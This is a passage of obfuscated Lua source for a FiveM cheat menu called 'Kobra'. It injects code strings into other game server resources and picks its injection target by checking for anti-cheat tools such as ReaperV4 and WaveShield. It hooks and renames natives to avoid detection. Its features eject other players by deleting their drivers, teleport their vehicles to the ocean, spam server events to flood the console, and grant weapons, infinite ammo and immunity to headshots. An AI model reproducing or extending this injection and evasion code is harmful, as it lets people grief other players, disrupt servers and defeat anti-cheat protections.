                                                        RequestControl(vehicle, 10)
                                                        DeletePed(driver)
                                                        SetPedIntoVehicle(player, vehicle, -1)
                                                        Wait(25)
                                                        TaskLeaveVehicle(player, vehicle, 16)
                                                        Wait(450)
                                                        -- DeleteEntity(vehicle)
                                                    end

                                                    Wait(100)
                                                end
                                            end

                                            CreateThread(function()
                                                local entityHit = ]]   .. GetVehiclePedIsUsing(GetPlayerPed(v891))   .. [[

                                                print(entityHit)

                                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                                    KickFromVehicleNewestV8(entityHit)
                                                end
                                            end)
                                        ]] );end else return;end v27[v434]=true;v281:UpdateListMenu();else v281:Notify("error","Kobra","You must select a player to do this!",3000);end break;end if (v433==(0 + 0)) then v434=nil;for v807,v808 in pairs(v27) do if v808 then v434=v807;break;end end v433=1 + 0 ;end end end},{type="button",label="Teleport to Ocean",onSelect=function() local v435=0 + 0 ;local v436;while true do if (v435==(0 + 0)) then v436=nil;for v809,v810 in pairs(v27) do if v810 then v436=v809;break;end end v435=1;end if (v435==(1 + 0)) then if v436 then local v893=GetPlayerFromServerId(v436);if (v893== -(1 + 0)) then local v1044=0 + 0 ;while true do if (v1044==(957 -(719 + 237))) then v12:UpdateListMenu();return;end if (0==v1044) then v281:Notify("error","Kobra","There was an error while trying to tp the vehicle to the ocean! (ERR:1)",8374 -5374 );v27[v436]=nil;v1044=1 + 0 ;end end end if  not DoesEntityExist(GetVehiclePedIsUsing(GetPlayerPed(v893))) then local v1045=0 -0 ;while true do if (v1045==0) then v281:Notify("error","Kobra","There was an error while trying to kick the player from their vehicle! (ERR:2)",8454 -5454 );return;end end end if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then for v1132=1,4 -2  do MachoInjectResourceRaw(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                            local function RequestControl(entity, timeoutMs)
                                                timeoutMs = timeoutMs or 2000
                                                local start = GetGameTimer()

                                                while (GetGameTimer() - start) < timeoutMs do
                                                    if NetworkHasControlOfEntity(entity) then return true end
                                                    NetworkRequestControlOfEntity(entity)
                                                    Wait(0)
                                                end

                                                return NetworkHasControlOfEntity(entity)
                                            end

                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            function GetEmptySeat(vehicle)
                                                local seats = { -1, 0, 1, 2 }

                                                for _, seat in ipairs(seats) do
                                                    if IsVehicleSeatFree(vehicle, seat) then
                                                        return seat
                                                    end
                                                end

                                                return -1
                                            end

                                            local player = PlayerPedId()

                                            local function TeleportVehicleToOcean(vehicle)
                                                if not vehicle or not DoesEntityExist(vehicle) then
                                                    return
                                                end

                                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                                if driver ~= 0 and DoesEntityExist(driver) then
                                                    for i = 1, 1 do
                                                        SetPedIntoVehicle(player, vehicle, 0)
                                                        RequestControl(vehicle, 10)
                                                        DeletePed(driver)
                                                        SetPedIntoVehicle(player, vehicle, -1)
                                                        Wait(25)
                                                        SetEntityCoords(vehicle, 0.0, 0.0, 0.0, false, false, false, false)
                                                        -- DeleteEntity(vehicle)
                                                    end

                                                    Wait(100)
                                                end
                                            end

                                            CreateThread(function()
                                                local entityHit = ]]   .. GetVehiclePedIsUsing(GetPlayerPed(v893))   .. [[

                                                print(entityHit)

                                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                                    TeleportVehicleToOcean(entityHit)
                                                end
                                            end)
                                        ]] );end else return;end v27[v436]=true;v281:UpdateListMenu();else v281:Notify("error","Kobra","You must select a player to do this!",3000);end break;end end end}}},{label="Triggers",tabs={{type="checkbox",label="Server Console Spam",checked=false,onSelect=function(v437) if v437 then local v613=0 + 0 ;while true do if (v613==(0 + 0)) then print("Console Spam Started...");v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                    if not _G.KobraServerConsoleSpamInitialized then
                                        _G.KobraServerConsoleSpamEnabled = true
                                        _G.KobraServerConsoleSpamInitialized = true

                                        local function HookNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        HookNative("CreateThread", function(fn, cb) return fn(cb) end)
                                        HookNative("Wait", function(fn, ms) return fn(ms) end)
                                        HookNative("TriggerEvent", function(fn, ...) return fn(...) end)
                                        HookNative("TriggerServerEvent", function(fn, ...) return fn(...) end)

                                        if not _G.Kobra then
                                            _G.Kobra = {
                                                TEvent = function(e, ...) return TriggerEvent(e, ...) end,
                                                TSEvent = function(e, ...) return TriggerServerEvent(e, ...) end
                                            }
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield Spam Coroutine error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            Citizen.Wait(500) -- Anti-detection delay
                                            while _G.KobraServerConsoleSpamInitialized do
                                                if not _G.KobraServerConsoleSpamEnabled then
                                                    Citizen.Wait(500)
                                                else
                                                    _G.Kobra.TSEvent("playerLoaded")
                                                    Citizen.Wait(75)
                                                end
                                            end
                                        end)
                                    else
                                        _G.KobraServerConsoleSpamEnabled = true
                                    end
                                ]]);break;end end else local v614=0;while true do if (v614==(0 + 0)) then print("Console Spam Stopped...");v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                    _G.KobraServerConsoleSpamEnabled = false
                                ]]);break;end end end end}}}}},{icon="",label="Weapon",type="subMenu",categories={{label="Spawner",tabs={{type="button",label="Give Weapon",onSelect=function() v59("Weapon Name","WEAPON_",function(v571) if (v571 and (v571~="")) then v281:SpawnSelectedWeapon(v571);end end,"typeable");end},{type="button",label="Give All Weapons",onSelect=function() v281:GiveAllWeapons();end},{type="button",label="Remove All Weapons",onSelect=function() v281:RemoveAllWeapons();end},{type="divider",label="All Weapons"},{type="scrollable",label="Melee",scrollType="onEnter",value=1,values=v281:BuildMenuFromWeaponList({"weapon_unarmed","weapon_knife","weapon_dagger","weapon_bat","weapon_bottle","weapon_crowbar","weapon_golfclub","weapon_hammer","weapon_hatchet","weapon_machete","weapon_switchblade","weapon_nightstick","weapon_wrench"}),onSelect=function(v438) v281:SpawnSelectedWeapon(v281:GetWeaponModelFromLabel(v438));end},{type="scrollable",label="Handguns",scrollType="onEnter",value=1,values=v281:BuildMenuFromWeaponList({"weapon_pistol","weapon_pistol_mk2","weapon_combatpistol","weapon_appistol","weapon_stungun","weapon_pistol50","weapon_snspistol","weapon_heavypistol","weapon_vintagepistol","weapon_flaregun"}),onSelect=function(v439) v281:SpawnSelectedWeapon(v281:GetWeaponModelFromLabel(v439));end},{type="scrollable",label="SMGs",scrollType="onEnter",value=1 -0 ,values=v281:BuildMenuFromWeaponList({"weapon_microsmg","weapon_smg","weapon_smg_mk2","weapon_assaultsmg","weapon_machinepistol","weapon_minismg","weapon_combatpdw"}),onSelect=function(v440) v281:SpawnSelectedWeapon(v281:GetWeaponModelFromLabel(v440));end},{type="scrollable",label="Rifles",scrollType="onEnter",value=1 + 0 ,values=v281:BuildMenuFromWeaponList({"weapon_assaultrifle","weapon_assaultrifle_mk2","weapon_carbinerifle","weapon_carbinerifle_mk2","weapon_advancedrifle","weapon_specialcarbine","weapon_bullpuprifle","weapon_gusenberg","weapon_compactrifle","weapon_bullpuprifle_mk2","weapon_marksmanrifle"}),onSelect=function(v441) v281:SpawnSelectedWeapon(v281:GetWeaponModelFromLabel(v441));end},{type="scrollable",label="Shotguns",scrollType="onEnter",value=1 + 0 ,values=v281:BuildMenuFromWeaponList({"weapon_pumpshotgun","weapon_pumpshotgun_mk2","weapon_sawnoffshotgun","weapon_assaultshotgun","weapon_bullpupshotgun","weapon_heavyshotgun","weapon_autoshotgun"}),onSelect=function(v442) v281:SpawnSelectedWeapon(v281:GetWeaponModelFromLabel(v442));end},{type="scrollable",label="Snipers",scrollType="onEnter",value=1,values=v281:BuildMenuFromWeaponList({"weapon_sniperrifle","weapon_heavysniper","weapon_heavysniper_mk2","weapon_marksmanrifle","weapon_marksmanrifle_mk2"}),onSelect=function(v443) v281:SpawnSelectedWeapon(v281:GetWeaponModelFromLabel(v443));end},{type="scrollable",label="Explosives",scrollType="onEnter",value=1 + 0 ,values=v281:BuildMenuFromWeaponList({"weapon_grenade","weapon_stickybomb","weapon_molotov","weapon_pipebomb","weapon_proxmine","weapon_rpg","weapon_grenadelauncher","weapon_rpg","weapon_minigun","weapon_firework"}),onSelect=function(v444) v281:SpawnSelectedWeapon(v281:GetWeaponModelFromLabel(v444));end},{type="scrollable",label="Heavy",scrollType="onEnter",value=1,values=v281:BuildMenuFromWeaponList({"weapon_mg","weapon_combatmg","weapon_gusenberg","weapon_minigun","weapon_grenadelauncher","weapon_railgun","weapon_hominglauncher","weapon_compactlauncher"}),onSelect=function(v445) v281:SpawnSelectedWeapon(v281:GetWeaponModelFromLabel(v445));end},{type="scrollable",label="Throwables",scrollType="onEnter",value=1 -0 ,values=v281:BuildMenuFromWeaponList({"weapon_ball","weapon_flare","weapon_smokegrenade","weapon_bzgas","weapon_petrolcan"}),onSelect=function(v446) v281:SpawnSelectedWeapon(v281:GetWeaponModelFromLabel(v446));end}}},{label="Combat",tabs={{type="button",label="Test Button",onSelect=function() print("hi");end},{type="checkbox",label="Infinite Ammo ",desc="Infinite Ammo, this might be detected on certain servers",checked=false,onSelect=function(v447) if v447 then local v615=0;while true do if (v615==0) then v281:Notify("success","Kobra","Enabled Infinite Ammo",9848 -4848 );v281:EnableInfiniteAmmo();break;end end else local v616=0 + 0 ;while true do if (v616==0) then v281:Notify("error","Kobra","Disabled Infinite Ammo",5000);v281:DisableInfiniteAmmo();break;end end end end},{type="checkbox",label="Anti-Headshot",checked=false,desc="This will prevent you from being headshot.",onSelect=function(v448) if v448 then v281:Notify("success","Kobra","Enabled Anti-Headshot",5000);if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n) return _G[decode(n)] end

                                            -- native wrappers (obfuscated lookup style)
                                            local SetPedSuffersCriticalHits = g({83,101,116,80,101,100,83,117,102,102,101,114,115,67,114,105,116,105,99,97,108,72,105,116,115})
                                            local PlayerPedId_fn = g({80,108,97,121,101,114,80,101,100,73,100})
                                            local Wait_fn = g({87,97,105,116})

                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            if not _G.antiHeadshotEnabled then
                                                _G.antiHeadshotEnabled = true

                                                -- initFlow (coroutine runner) — copy of your project's coroutine runner pattern
                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[AntiHeadshot] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.antiHeadshotEnabled and not Unloaded do
                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetPedSuffersCriticalHits(ped, false)
                                                        end
                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            if not _G.antiHeadshotEnabled then
                                                _G.antiHeadshotEnabled = true

                                                local CreateThread_fn = CreateThread
                                                local Wait_fn = Wait
                                                local PlayerPedId_fn = PlayerPedId
                                                local SetPedSuffersCriticalHits_fn = SetPedSuffersCriticalHits

                                                CreateThread_fn(function()
                                                    while true do
                                                        Wait_fn(0)
                                                        if not _G.antiHeadshotEnabled then
                                                            Wait_fn(500)
                                                            goto continue
                                                        end

                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetPedSuffersCriticalHits_fn(ped, false)
                                                        end

                                                        ::continue::
                                                    end
                                                end)
                                            end
                                            _G.antiHeadshotEnabled = true
                                        ]]);end else v281:Notify("error","Kobra","Disabled Anti-Headshot",5000);if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            -- simply clear the flag; coroutine loop will stop
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            _G.antiHeadshotEnabled = false
                                        ]]);else v48("any",[[
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            _G.antiHeadshotEnabled = false

                                            -- try to restore default behavior once (best-effort)
                                            if PlayerPedId and SetPedSuffersCriticalHits then
                                                local ped = PlayerPedId()
                                                if ped and ped ~= 0 then
                                                    pcall(function() SetPedSuffersCriticalHits(ped, true) end)
                                                end
                                            end
                                        ]]);end end end}}}}},{icon="",label="Vehicle",type="subMenu",categories={{label="Spawner",tabs={{type="checkbox",label="Teleport Into",desc="If selected, this will teleport you into the selected vehicle.",checked=false,onSelect=function(v449) v43=v449 or false ;end},{type="checkbox",label="Delete Previous",desc="If selected, this will delete your previous vehicle when spawning selected vehicle.",checked=false,onSelect=function(v450) v42=v450 or false ;end},{type="divider",label="All Vehicles"},{type="button",label="Addon",onSelect=function() v59("Addon Vehicle","",function(v572) if (v572 and (v572~="")) then v281:SpawnSelectedVehicle(v572,v43,v42);end end,"typeable");end},{icon="ph ph-car",label="Compacts",type="scrollable",scrollType="onEnter",value=1 + 0 ,values={"asbo","blista","brioso","brioso2","brioso3","club","dilettante","dilettante2","issi2","issi3","issi4","issi5","issi6","kanjo","panto","prairie","rhapsody","weevil"},onSelect=function(v451) v281:SpawnSelectedVehicle(v451,v43,v42);end},{icon="ph ph-car",label="Sedans",type="scrollable",scrollType="onEnter",value=608 -(45 + 562) ,values={"asea","asea2","asterope","asterope2","cinquemila","driftchavosv6","cog55","cog552","cognoscenti","cognoscenti2","deity","hardy","drifthardy","emperor","emperor2","emperor3","fugitive","glendale","glendale2","impaler5","ingot","intruder","minimus","limo2","premier","primo","primo2","regina","rhinehart","romero","schafter2","schafter5","schafter6","stafford","stanier","stratum","stretch","superd","surge","tailgater","tailgater2","warrener","warrener2","washington"},onSelect=function(v452) v281:SpawnSelectedVehicle(v452,v43,v42);end},{icon="ph ph-car",label="SUVs",type="scrollable",scrollType="onEnter",value=1,values={"aleutian","astron","baller","baller2","baller3","baller4","baller5","baller6","baller7","baller8","bjxl","cavalcade","cavalcade2","cavalcade3","contender","dorado","dubsta","dubsta2","everon3","fq2","granger","granger2","gresley","habanero","huntley","issi8","iwagen","jubilee","landstalker","landstalker2","mesa","mesa2","novak","patriot","patriot2","radi","rebla","rocoto","seminole","seminole2","serrano","squaddie","toros","vivanite","woodlander","xls","xls2"},onSelect=function(v453) v281:SpawnSelectedVehicle(v453,v43,v42);end},{icon="ph ph-car",label="Coupes",type="scrollable",scrollType="onEnter",value=1469 -(1261 + 207) ,values={"cogcabrio","driftfr36","exemplar","f620","felon","felon2","fr36","jackal","kanjosj","oracle","oracle2","postlude","previon","sentinel","sentinel2","windsor","windsor2","zion","zion2"},onSelect=function(v454) v281:SpawnSelectedVehicle(v454,v43,v42);end},{icon="ph ph-car",label="Muscles",type="scrollable",scrollType="onEnter",value=2 -1 ,values={"blade","brigham","broadway","buccaneer","buccaneer2","buffalo4","buffalo5","chino","chino2","clique","clique2","coquette3","deviant","dominator","dominator2","dominator3","dominator4","dominator5","dominator6","dominator7","dominator8","dominator9","driftdominator10","driftyosemite","dukes","dukes2","dukes3","ellie","eudora","faction","faction2","faction3","gauntlet","gauntlet2","gauntlet3","gauntlet4","gauntlet5","driftgauntlet4","greenwood","hermes","hotknife","hustler","impaler","impaler2","impaler3","impaler4","impaler6","imperator","imperator2","imperator3","lurcher","manana2","moonbeam","moonbeam2","nightshade","peyote2","phoenix","picador","ratloader","ratloader2","ruiner","ruiner2","ruiner3","ruiner4","sabregt","sabregt2","slamvan","slamvan2","slamvan3","slamvan4","slamvan5","slamvan6","stalion","stalion2","tahoma","tampa","tampa3","tampa4","tulip","tulip2","vamos","vigero","vigero2","vigero3","virgo","virgo2","virgo3","voodoo","voodoo2","weevil2","yosemite","yosemite2"},onSelect=function(v455) v281:SpawnSelectedVehicle(v455,v43,v42);end},{icon="ph ph-car",label="Sports Classic",type="scrollable",scrollType="onEnter",value=1,values={"ardent","btype","btype2","btype3","casco","cheburek","cheetah2","cheetah3","coquette2","deluxo","dynasty","fagaloa","feltzer3","gt500","infernus2","jb700","jb7002","mamba","manana","michelli","monroe","nebula","peyote","peyote3","pigalle","rapidgt3","retinue","retinue2","savestra","stinger","stingergt","stromberg","swinger","toreador","torero","tornado","tornado2","tornado3","tornado4","tornado5","tornado6","turismo2","viseris","z190","zion3","ztype"},onSelect=function(v456) v281:SpawnSelectedVehicle(v456,v43,v42);end},{icon="ph ph-car",label="Sports",type="scrollable",value=1 + 0 ,values={"alpha","banshee","bestiagts","blista2","blista3","buffalo","buffalo2","buffalo3","calico","carbonizzare","comet2","comet3","comet4","comet5","comet6","comet7","coquette","coquette4","corsita","coureur","cypher","drafter","drifteuros","driftfuto","driftjester","driftremus","drifttampa","driftzr350","elegy","elegy2","euros","everon2","feltzer2","flashgt","furoregt","fusilade","futo","futo2","gauntlet6","gb200","growler","hotring","imorgon","issi7","italigto","italirsx","jester","jester2","jester3","jester4","jugular","khamelion","komoda","kuruma","kuruma2","locust","lynx","massacro","massacro2","neo","neon","ninef","ninef2","omnis","omnisegt","panthere","paragon","paragon2","pariah","penumbra","penumbra2","r300","raiden","rapidgt","rapidgt2","rapidgt4","raptor","remus","revolter","rt3000","ruston","schafter3","schafter4","schlagen","schwarzer","sentinel3","sentinel4","sentinel5","seven70","sm722","specter","specter2","stingertt","streiter","sugoi","sultan","sultan2","sultan3","surano","tampa2","tenf","tenf2","tropos","vectre","verlierer2","veto","veto2","vstr","zr350","zr380","zr3802","zr3803"},onSelect=function(v457) v281:SpawnSelectedVehicle(v457,v43,v42);end},{icon="ph ph-car",label="Super",type="scrollable",scrollType="onEnter",value=1,values={"adder","autarch","banshee2","bullet","champion","cheetah","cyclone","deveste","emerus","entity2","entity3","entityxf","fmj","furia","gp1","ignus","infernus","italigtb","italigtb2","krieger","le7b","lm87","nero","nero2","osiris","penetrator","pfister811","prototipo","reaper","s80","sc1","scramjet","sheava","sultanrs","suzume","t20","taipan","tempesta","tezeract","thrax","tigon","torero2","turismo3","turismor","tyrant","tyrus","vacca","vagner","vigilante","virtue","visione","voltic","voltic2","xa21","zeno","zentorno","zorrusso"},onSelect=function(v458) v281:SpawnSelectedVehicle(v458,v43,v42);end},{icon="ph ph-car",label="Motorcycles",type="scrollable",scrollType="onEnter",value=1 + 0 ,values={"akuma","avarus","bagger","bati","bati2","bf400","carbonrs","chimera","cliffhanger","daemon","daemon2","deathbike","deathbike2","deathbike3","defiler","diablous","diablous2","double","enduro","esskey","faggio","faggio2","faggio3","fcr","fcr2","gargoyle","hakuchou","hakuchou2","hexer","innovation","lectro","manchez","manchez2","manchez3","nemesis","nightblade","oppressor","oppressor2","pcj","powersurge","ratbike","reever","rrocket","ruffian","sanchez","sanchez2","sanctus","shinobi","shotaro","sovereign","stryder","thrust","vader","vindicator","vortex","wolfsbane","zombiea","zombieb"},onSelect=function(v459) v281:SpawnSelectedVehicle(v459,v43,v42);end},{icon="ph ph-car",label="Off-Road",type="scrollable",scrollType="onEnter",value=1,values={"bfinjection","bifta","blazer","blazer2","blazer3","blazer4","blazer5","bodhi2","boor","brawler","bruiser","bruiser2","bruiser3","brutus","brutus2","brutus3","caracara","caracara2","dloader","draugur","driftl352","dubsta3","dune","dune2","dune3","dune4","dune5","freecrawler","hellion","insurgent","insurgent2","insurgent3","kalahari","kamacho","l35","l352","marshall","menacer","mesa3","monster","monster3","monster4","monster5","monstrociti","nightshark","outlaw","patriot3","rancherxl","rancherxl2","ratel","rcbandito","rebel","rebel2","riata","sandking","sandking2","technical","technical2","technical3","terminus","trophytruck","trophytruck2","vagrant","verus","winky","yosemite3","zhaba"},onSelect=function(v460) v281:SpawnSelectedVehicle(v460,v43,v42);end},{icon="ph ph-car",label="Industrial",type="scrollable",scrollType="onEnter",value=333 -(268 + 64) ,values={"bulldozer","cutter","dump","flatbed","flatbed2","guardian","handler","mixer","mixer2","rubble","tiptruck","tiptruck2"},onSelect=function(v461) v281:SpawnSelectedVehicle(v461,v43,v42);end},{icon="ph ph-car",label="Utility",type="scrollable",scrollType="onEnter",value=806 -(603 + 202) ,values={"airtug","armytanker","armytrailer","armytrailer2","baletrailer","boattrailer","boattrailer2","boattrailer3","caddy","caddy2","caddy3","docktrailer","docktug","forklift","freighttrailer","graintrailer","mower","proptrailer","raketrailer","ripley","sadler","sadler2","scrap","slamtruck","tanker","tanker2","towtruck","towtruck2","towtruck3","towtruck4","tr2","tr3","tr4","tractor","tractor2","tractor3","trailerlarge","trailerlogs","trailers","trailers2","trailers3","trailers4","trailers5","trailersmall","trflat","tvtrailer","tvtrailer2","utillitruck","utillitruck2","utillitruck3"},onSelect=function(v462) v281:SpawnSelectedVehicle(v462,v43,v42);end},{icon="ph ph-car",label="Vans",type="scrollable",scrollType="onEnter",value=1874 -(674 + 1199) ,values={"bison","bison2","bison3","bobcatxl","boxville","boxville2","boxville3","boxville4","boxville5","boxville6","burrito","burrito2","burrito3","burrito4","burrito5","camper","gburrito","gburrito2","journey","journey2","minivan","minivan2","paradise","pony","pony2","rumpo","rumpo2","rumpo3","speedo","speedo2","speedo4","speedo5","surfer","surfer2","surfer3","taco","youga","youga2","youga3","youga4"},onSelect=function(v463) v281:SpawnSelectedVehicle(v463,v43,v42);end}}},{label="Vehicle Customization",tabs={{type="button",label="Set License Plate",onSelect=function() v59("Set License Plate","",function(v573) if (v573 and (v573~="")) then local v719=997 -(339 + 658) ;local v720;while true do if (0==v719) then v720=string.format([[
                                            local function xKqLZVwPt9()
                                                local XcVbNmAsDfGhJkL = PlayerPedId
                                                local TyUiOpZxCvBnMzLk = GetVehiclePedIsIn
                                                local PoIuYtReWqAzXsDc = _G.SetVehicleNumberPlateText

                                                local pEd = XcVbNmAsDfGhJkL()
                                                local vEh = TyUiOpZxCvBnMzLk(pEd, false)

                                                if vEh and vEh ~= 0 then
                                                    PoIuYtReWqAzXsDc(vEh, "%s")
                                                end
                                            end

                                            xKqLZVwPt9()
                                        ]],v573);MachoInjectResourceRaw("any",v720);break;end end else v12:Notify("Invalid input","Please enter a valid license plate.","error");end end,"typeable");end},{type="button",label="Repair Vehicle",onSelect=function() v281:RepairVehicle();end},{type="button",label="Clean Vehicle",onSelect=function() v12:Notify("success","Kobra","Cleaned Vehicle",6141 -3141 );MachoInjectResourceRaw("any",[[
                            local function qPwRYKz7mL()
                                local a = PlayerPedId
                                local b = GetVehiclePedIsIn
                                local c = SetVehicleDirtLevel

                                local ped = a()
                                local veh = b(ped, false)
                                if veh and veh ~= 0 then
                                    c(veh, 0.0)
                                end
                            end

                            qPwRYKz7mL()
                            ]]);end},{type="button",label="Force Vehicle Engine",onSelect=function() v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInVehicle", function(originalFn, ...) return false end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return false end)
                                hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if GhYtReFdCxWaQzLp == nil then GhYtReFdCxWaQzLp = false end
                                GhYtReFdCxWaQzLp = true

                                local function OpAsDfGhJkLzXcVb()
                                    local lMnbVcXzZaSdFg = CreateThread
                                    lMnbVcXzZaSdFg(function()
                                        local QwErTyUiOp         = _G.PlayerPedId
                                        local AsDfGhJkLz         = _G.GetVehiclePedIsIn
                                        local TyUiOpAsDfGh       = _G.GetVehiclePedIsTryingToEnter
                                        local ZxCvBnMqWeRtYu     = _G.SetVehicleEngineOn
                                        local ErTyUiOpAsDfGh     = _G.SetVehicleUndriveable
                                        local KeEpOnAb           = _G.SetVehicleKeepEngineOnWhenAbandoned
                                        local En_g_Health_Get    = _G.GetVehicleEngineHealth
                                        local En_g_Health_Set    = _G.SetVehicleEngineHealth
                                        local En_g_Degrade_Set   = _G.SetVehicleEngineCanDegrade
                                        local No_Hotwire_Set     = _G.SetVehicleNeedsToBeHotwired

                                        local function _tick(vh)
                                            if vh and vh ~= 0 then
                                                No_Hotwire_Set(vh, false)
                                                En_g_Degrade_Set(vh, false)
                                                ErTyUiOpAsDfGh(vh, false)
                                                KeEpOnAb(vh, true)

                                                local eh = En_g_Health_Get(vh)
                                                if (not eh) or eh < 300.0 then
                                                    En_g_Health_Set(vh, 900.0)
                                                end

                                                ZxCvBnMqWeRtYu(vh, true, true, true)
                                            end
                                        end

                                        while GhYtReFdCxWaQzLp and not Unloaded do
                                            local p  = QwErTyUiOp()

                                            _tick(AsDfGhJkLz(p, false))
                                            _tick(TyUiOpAsDfGh(p))
                                            _tick(AsDfGhJkLz(p, true))

                                            Wait(0)
                                        end
                                    end)
                                end

                                OpAsDfGhJkLzXcVb()
                            ]]);end,function() v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                GhYtReFdCxWaQzLp = false
                                local v = GetVehiclePedIsIn(PlayerPedId(), false)
                                if v and v ~= 0 then
